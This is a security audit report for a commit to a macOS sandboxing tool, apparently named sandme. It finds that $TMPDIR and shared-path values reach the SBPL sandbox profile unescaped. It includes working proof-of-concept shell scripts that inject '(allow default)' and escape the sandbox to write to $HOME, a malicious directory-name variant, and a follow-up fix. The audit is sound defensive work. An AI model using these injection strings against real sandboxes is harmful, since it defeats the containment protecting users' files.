# Security audit — commit `be0993f` "fix(profile): confine to the working directory and the per-user temp dir (#12)"

- **Date**: 2026-09-11
- **Scope of this audit**: the diff of `be0993f` against `main` (`53482e4`) —
  the change to `default_shared_paths()` (`src/config.rs`), the new
  `user_temp_dir()` and the narrowed `gui_mode` temp grant (`src/profile.rs`),
  and `(deny appleevent-send)`. Audited against the two classes the
  `security-audit` skill defines: string injection into the SBPL profile, and
  process privilege escalation out of the sandbox.
- **Governing spec**: SPEC-0007 (FR-701/702/703, NFR-701).
- **Binary under test**: `cargo build` debug binary, macOS 26 (Darwin 25.6.0,
  Apple silicon).

## Summary

The change introduces a **new, working SBPL-injection sink**: `user_temp_dir()`
reads `$TMPDIR` from the environment and, when its `std::fs::canonicalize` call
fails (which it does for any non-existent path), interpolates the **raw**
`$TMPDIR` string into the profile with no escaping or rejection
(`src/profile.rs:124`, `:138-141`). A `$TMPDIR` value carrying `")` and
balancing parentheses closes the `subpath` literal and injects arbitrary SBPL
rules. With `gui_mode` enabled I injected `(allow default)` and demonstrated a
full filesystem escape — the sandboxed command wrote to `$HOME` (which the
default profile denies) — against the built binary. This is the highest-priority
check the task named, and the answer is: **yes, `$TMPDIR` reaches the profile
unescaped and I can inject through it. HIGH, and a merge blocker.**

The same unescaped-interpolation defect is **pre-existing** in the
`shared_paths` path (`expand_path` → `src/profile.rs:100-106`, `:177-186`); I
re-confirmed it still escapes via `SANDME_SHARED_PATHS`. The new
`default_shared_paths()` (cwd) does not add a *benign* widening — the cwd default
is a genuine narrowing per FR-701 — but it does feed a new attacker-influenceable
source (the invocation directory's own name) into that same unescaped sink; I
demonstrated the cwd-name variant at least corrupts the profile (a
denial-of-service / fail-shut), with a fully-balanced-name escape plausible but
not demonstrated. `(deny appleevent-send)` is correct and position-independent
and is verified clean.

The two injection findings share one root cause and one fix: sandme must escape
SBPL metacharacters (or reject values containing them at config time) before any
env- or config-derived string reaches `writeln!(sbpl, …)`.

## Findings

### F-1 — `$TMPDIR` is interpolated into the SBPL profile unescaped; a crafted value injects arbitrary rules (SBPL breakout) — **HIGH** — merge blocker

- **Requirement**: violates the default-deny / "profile grants exactly what is
  configured" invariant behind SPEC-0001 FR-004/FR-006 and the narrowing intent
  of **SPEC-0007 FR-702** (which scopes the grant to *the user's own* `$TMPDIR`,
  not to arbitrary attacker-chosen rules). This finding is the injection class
  the skill centres on, applied to the value this commit newly added.
- **Vulnerable lines**:
  - `src/profile.rs:123-125` — `if let Some(temp) = user_temp_dir() { … writeln!(sbpl, "(allow file-read* file-write* (subpath \"{temp}\"))") }`
  - `src/profile.rs:138-141` — `user_temp_dir()`:
    `let tmpdir = std::env::var("TMPDIR").ok()?; Some(std::fs::canonicalize(&tmpdir).map_or(tmpdir, |resolved| resolved.display().to_string()))`
    — on canonicalize failure the **raw** `$TMPDIR` is returned. Any path that
    does not exist on disk (a crafted injection string never does) takes this
    branch, exactly the "`expand_path` only canonicalises paths that exist"
    caveat the skill calls out, here reproduced verbatim in a new function.
- **Source / who controls it**: `$TMPDIR` is an environment variable. macOS sets
  it per login session, but it is inherited and thus influenceable by whatever
  launches sandme — a parent script, a `Makefile`, `direnv`/`.envrc`, a CI
  runner, or any less-trusted process that sets `TMPDIR` before invoking sandme.
  sandme's guarantee is that the profile does exactly what the user configured;
  a user who enabled only `gui_mode` must not thereby receive `(allow default)`.
- **Precondition**: `gui_mode` on (`SANDME_GUI_MODE=1` or config). No injection
  reaches the profile without it, which is why this is High and not Critical.
- **Attack scenario**: attacker sets
  `TMPDIR='/private/tmp")) (allow default) (allow file-read* file-write* (subpath "/private/tmp'`.
  `user_temp_dir()` canonicalizes it, fails (no such path), returns the raw
  string, and the emitted line becomes three balanced s-expressions:
  `(allow file-read* file-write* (subpath "/private/tmp")) (allow default) (allow file-read* file-write* (subpath "/private/tmp"))`.
  The injected `(allow default)` sits before the closing unconditional denials,
  so everything is granted except the four dirs those denials still cover
  (`~/Library/{Keychains,LaunchAgents,LaunchDaemons}`, `~/.sandme`) — a near-total
  sandbox escape.
- **PoC** (against the `cargo build` binary; `WORK` is an empty dir so the cwd
  share does not itself grant `$HOME`; distinct free proxy port to avoid a port
  clash):

  ```bash
  BIN="$PWD/target/debug/sandme"
  WORK=/tmp/poc-cwd; rm -rf "$WORK"; mkdir -p "$WORK"
  MARKER="$HOME/sandme-tmpdir-injection-poc-$$"; rm -f "$MARKER"

  # CONTROL — benign TMPDIR: write to $HOME (outside the cwd share) is denied
  ( cd "$WORK" && env -u SANDME_SHARED_PATHS TMPDIR="/private/tmp/" \
      SANDME_GUI_MODE=1 SANDME_PROXY_PORT=18787 \
      "$BIN" "echo pwned > '$MARKER' && echo WROTE-CONTROL"; echo "exit=$?" )

  # ATTACK — crafted TMPDIR injects (allow default)
  INJECT='/private/tmp")) (allow default) (allow file-read* file-write* (subpath "/private/tmp'
  ( cd "$WORK" && env -u SANDME_SHARED_PATHS TMPDIR="$INJECT" \
      SANDME_GUI_MODE=1 SANDME_PROXY_PORT=18787 \
      "$BIN" "echo pwned > '$MARKER' && echo WROTE-ATTACK"; echo "exit=$?" )
  [ -f "$MARKER" ] && echo "ESCAPED: $(cat "$MARKER")"
  ```

  Output:

  ```
  # CONTROL
  /bin/sh: /Users/pepe/sandme-tmpdir-injection-poc-5609: Operation not permitted
  exit=1
  marker exists after control? -> NO
  # ATTACK
  WROTE-ATTACK
  exit=0
  marker exists after attack?  -> YES
  ESCAPED: pwned
  ```

  The control write to `$HOME` is refused by the sandbox; the attack write —
  same command, only `$TMPDIR` differs — succeeds and creates the marker. The
  injected `(allow default)` took effect.
- **Suggested direction**: neither escape nor reject is currently applied to
  `$TMPDIR`. sandme must do one of the two before the value reaches
  `writeln!` — escape SBPL metacharacters (`"`, `\`, and reject/strip newlines),
  or reject a `$TMPDIR` that contains any of `"`, `(`, `)`, newline at profile
  generation and fall back to granting nothing (fail-shut). Note that the
  existing `canonicalize` step is not a mitigation: it is bypassed for exactly
  the non-existent paths an injection uses.

### F-2 — `shared_paths` / cwd default reach the same unescaped sink (SBPL breakout) — **HIGH** — merge blocker (pre-existing root cause; this commit adds a new source)

- **Requirement**: same invariant as F-1 (SPEC-0001 FR-004/FR-006). The
  `shared_paths` half is **pre-existing** (the skill's own example PoC uses it);
  it is re-confirmed here because the skill requires it re-checked and because
  this commit's `default_shared_paths()` change makes the **current working
  directory's name** a new, automatic, attacker-influenceable feed into it.
- **Vulnerable lines**:
  - `src/profile.rs:100-106` — the `shared_paths` loop, `writeln!(sbpl, "(allow file-read* file-write* (subpath \"{expanded}\"))")`.
  - `src/profile.rs:177-186` — `expand_path`: same "canonicalize only if it
    exists, else raw" bypass.
  - `src/config.rs:72-76` — `default_shared_paths()` now returns
    `env::current_dir()`; the directory name flows unescaped into `expand_path`.
- **Source / who controls it**: `shared_paths` from config file,
  `SANDME_SHARED_PATHS`, or (new) the invocation directory's own name. A
  directory name on macOS may contain `"`, `(`, `)` (anything but `/` and NUL),
  so a maliciously named directory a victim `cd`s into feeds the sink.
- **PoC (shared_paths, no gui_mode needed)** — full escape confirmed:

  ```bash
  INJECT='/private/tmp")) (allow default) (allow file-read* file-write* (subpath "/private/tmp'
  MARKER="$HOME/sandme-sharedpath-injection-poc-$$"; rm -f "$MARKER"
  env SANDME_SHARED_PATHS="$INJECT" SANDME_PROXY_PORT=18788 \
      "$BIN" "echo pwned > '$MARKER' && echo WROTE-SHAREDPATH"; echo "exit=$?"
  [ -f "$MARKER" ] && echo "ESCAPED"
  ```

  Output:

  ```
  WROTE-SHAREDPATH
  exit=0
  marker exists? -> YES
  ```

- **PoC (cwd-name variant)** — the new default feeds the sink; demonstrated as a
  profile-corruption DoS (fail-shut), not a full escape:

  ```bash
  EVILDIR='/tmp/scratch/x") (allow default) (subpath "/x'
  mkdir -p "$EVILDIR"
  ( cd "$EVILDIR" && env -u SANDME_SHARED_PATHS SANDME_PROXY_PORT=18789 \
      "$BIN" "echo pwned > '$MARKER'"; echo "exit=$?" )
  ```

  Output:

  ```
  sandbox-exec: illegal argument:  #t
  <input string>:25:168:
      (subpath "/x")
  exit=65
  marker exists? -> NO
  ```

  Because `canonicalize` succeeds for an existing directory it prepends the real
  absolute path, so a *cleanly balanced* injection through the directory name is
  more constrained than the `$TMPDIR`/env case; here it produced an invalid
  profile and the command failed to run. A correctly balanced directory name
  could plausibly escape rather than merely corrupt; not demonstrated, so the
  escape claim for *this specific vector* is not graded above the confirmed DoS.
  The env-string vectors (F-1 and `SANDME_SHARED_PATHS`) are the demonstrated
  escapes and carry the High.
- **Suggested direction**: identical to F-1 — one escape/reject step covering
  every value formatted into the profile fixes F-1 and F-2 together.

### F-3 — Unrestricted `process-exec` combined with a writable share — **NOTE** (inherent to the product; unchanged by this commit)

- `src/profile.rs:41` grants `(allow process-exec)`, and every writable share
  (cwd by default, `$TMPDIR`/`~/Library` under `gui_mode`) lets the child write
  a binary and then execute it. This is inherent to running a coding agent that
  must invoke tools; the skill classes it a Note, not a Critical, and this
  commit does not change it. Recorded so the next audit starts from evidence.

## Verified clean

- **`(deny appleevent-send)` (FR-703)** — present at `src/profile.rs:52`. It is
  a `deny` of an operation nothing in the profile grants, so its mid-profile
  position is immaterial (SBPL last-match-wins only matters when a later rule
  could re-grant; none does). Not a string sink. `denies_the_appleevent_send_operation`
  passes. Verified clean.
- **cwd default is a narrowing, not a benign widening (FR-701)** — the default
  share moved from `["~/"]` to the cwd (`src/config.rs:72-76`); a fresh install
  no longer exposes `~/.ssh`/`~/.aws`. Confirmed intended narrowing. Its only
  security concern is that the cwd *name* joins the injection sink (F-2), not
  that the grant itself is too wide.
- **`$TMPDIR`-unset edge case** — `user_temp_dir()` returns `None`
  (`src/profile.rs:139`), no temp rule is emitted; matches the SPEC-0007 edge
  case. Verified clean (functional correctness; the injection risk is F-1).
- **Network egress rule** — `src/profile.rs:67-71` still emits only
  `(allow network-outbound (remote ip "localhost:{port}"))` and no other
  destination; `network-bind` remains absent. `routes_network_only_to_the_proxy`
  passes. Unchanged by this commit and re-checked. Verified clean.
- **Unconditional denials still last** — `append_unconditional_denials`
  (`src/profile.rs:149-162`) is emitted after the writable grants and the
  network rule; `denies_the_launchd_and_keychain_directories_after_every_grant`
  passes. (Note: these final denials are what keep an injected `(allow default)`
  from reaching `~/Library/{Keychains,LaunchAgents,LaunchDaemons}` and
  `~/.sandme` — they limit, but do not close, the F-1/F-2 escape.) Verified clean
  as to ordering.

## Out of scope (per the skill's scope table)

- **`resolve_app_bundle_executable` / plist parsing** — `app_bundle.rs`
  `executable_name` (`:106-110`) rejects a `CFBundleExecutable` containing `/`
  and guards with `main.is_file()`; not touched by this commit. Noted, not
  audited in depth here.
- **Proxy HTTP handling (`src/proxy.rs`, `src/egress.rs`)** — out of scope except
  where it changes what the profile allows; this commit does not touch it.
- **CLI parsing (`src/main.rs`, `src/config.rs` env/file plumbing)** — in scope
  only as the source of attacker-influenced strings, which is exactly how F-1/F-2
  are traced.
- **`mach-lookup` family / `process-exec` narrowing** — SPEC-0007 explicitly
  defers the `mach-lookup` allowlist (#12 §4, Open questions); not a regression
  of this commit.

## Quality gate (branch `worktree-agent-a50ba2c546bf35324`, after adding only this report)

- `cargo fmt --check` — clean (rc 0)
- `cargo clippy --all-targets -- -D warnings` — 0 warnings (rc 0)
- `cargo build` — 0 warnings
- `cargo test` — 36 unit + 41 integration tests, 0 failed
- `cargo doc --no-deps` — 0 warnings

---

## Resolution (2026-09-11, follow-up commit)

Both HIGH findings are **closed** on this branch by a fail-shut guard, added after the audit above.

`generate_profile` now returns `Result`; every path written into a `(subpath "…")` rule —
`shared_paths`, `$HOME`, `$TMPDIR`, the working directory — passes through `checked_profile_path`,
which rejects any value containing a double quote, a backslash, or an ASCII control character with
`SandmeError::UnsafeProfilePath`. Measured against `sandbox-exec`, those are the characters that
break out of the literal; parentheses and spaces are inert and remain permitted, so ordinary macOS
paths (e.g. `My Project (2024)`) still work. This is FR-704 in SPEC-0007, and it closes the
pre-existing class tracked as [#41](https://github.com/leopepe/sandme/issues/41).

Re-verified against the rebuilt binary with the audit's own PoCs:

```
# F-1 ($TMPDIR), gui_mode on, empty cwd share, child writes to $HOME:
sandme: path "…\")) (allow default) …" contains a character that cannot be placed in the
  sandbox profile (a quote, backslash, or control character); refusing to run
exit=125 ; escape marker created? NO

# F-2 (shared_paths): same refusal, exit 125, no write.
# Control — benign $TMPDIR and a shared path containing "My Proj (2024)": both run and write OK.
```

Verified by `refuses_a_shared_path_that_would_break_out_of_the_profile` and
`admits_a_shared_path_with_parentheses_and_spaces` (`src/profile.rs`), and end-to-end by
`refuses_to_run_when_tmpdir_would_inject_into_the_profile` (`tests/cli.rs`).
